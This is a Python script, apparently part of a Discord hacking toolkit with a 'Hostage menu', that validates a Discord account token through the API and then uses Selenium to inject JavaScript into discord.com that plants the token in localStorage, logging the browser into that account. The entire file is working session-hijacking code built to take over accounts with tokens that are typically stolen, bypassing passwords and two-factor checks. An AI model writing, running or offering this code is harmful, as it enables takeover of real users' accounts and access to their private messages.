import requests
import time
from selenium import webdriver

# Define necessary constants for formatting (red and black design)
BEFORE = "\033[1;31m"  # Red
AFTER = "\033[0m"  # Reset
INFO = "\033[1;37m"  # White
GEN_VALID = "\033[1;32m"  # Green
INPUT = "\033[1;33m"  # Yellow
WHITE = "\033[1;37m"  # White

# Function to get the current time
def current_time_hour():
    return time.strftime("%H:%M:%S", time.gmtime())

# Function to display error messages
def Error(message):
    print(f"{BEFORE}ERROR: {message}{AFTER}")

# Function to check if the token is valid
def CheckToken(token_number, token):
    response = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token, 'Content-Type': 'application/json'})
    
    if response.status_code == 200:
        user = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
        username_discord = user['username']
        token_sensur = token[:-25] + '.' * 3
        print(f" {BEFORE}{token_number}{AFTER} -> {INFO}Valid Token{BEFORE} | User: {WHITE}{username_discord}{BEFORE} | Token: {WHITE}{token_sensur}{AFTER}")
    else:
        print(f" {BEFORE}{token_number}{AFTER} -> {INFO}Invalid Token{BEFORE} | Token: {WHITE}{token}{AFTER}")

# Function to input a single token
def Choice1TokenDiscord():
    try:
        token = input(f"{BEFORE}{current_time_hour()}{AFTER} {INPUT}Enter Discord Token -> {AFTER}")
        CheckToken(1, token)
        return token
    except Exception as e:
        Error(f"Invalid Token Input: {e}")
        return None

# Function to select a browser
def select_browser():
    print(f"""
 {BEFORE}01{AFTER}{WHITE} Chrome (Windows / Linux)
 {BEFORE}02{AFTER}{WHITE} Edge (Windows)
 {BEFORE}03{AFTER}{WHITE} Firefox (Windows)
    """)
    return input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Browser -> {AFTER}")

# Main execution for Discord Token Login
def main():
    try:
        token = Choice1TokenDiscord()

        if not token:
            return

        browser = select_browser()

        driver = None  # Initialize driver to None

        if browser in ['1', '01']:
            try:
                print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Starting Chrome..")
                driver = webdriver.Chrome()
                print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Chrome Ready!")
            except Exception as e:
                Error(f"Chrome not installed or driver not up to date: {e}")

        elif browser in ['2', '02']:
            try:
                print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Starting Edge..")
                driver = webdriver.Edge()
                print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Edge Ready!")
            except Exception as e:
                Error(f"Edge not installed or driver not up to date: {e}")

        elif browser in ['3', '03']:
            try:
                print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Starting Firefox..")
                driver = webdriver.Firefox()
                print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Firefox Ready!")
            except Exception as e:
                Error(f"Firefox not installed or driver not up to date: {e}")

        else:
            Error("Invalid Browser Choice")
            return

        if driver:
            # Discord token injection script
            script = """
                    function login(token) {
                    setInterval(() => {
                    document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`;
                    }, 50);
                    setTimeout(() => {
                    location.reload();
                    }, 2500);
                    }
                    """

            driver.get("https://discord.com/login")
            print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Token Connection..")
            driver.execute_script(script + f'\nlogin("{token}")')
            time.sleep(4)
            print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Connected Token!")

            # Keep the browser open until the user presses Enter
            input(f"{BEFORE}Press Enter to return to the Hostage menu without closing the browser...{AFTER}")

            # Keep the browser open after returning to the menu
            print(f"{INFO}Browser will remain open, returning to Hostage menu.{AFTER}")

        else:
            Error("Browser driver initialization failed, cannot proceed.")

    except Exception as e:
        Error(f"Unexpected Error: {e}")

if __name__ == "__main__":
    main()
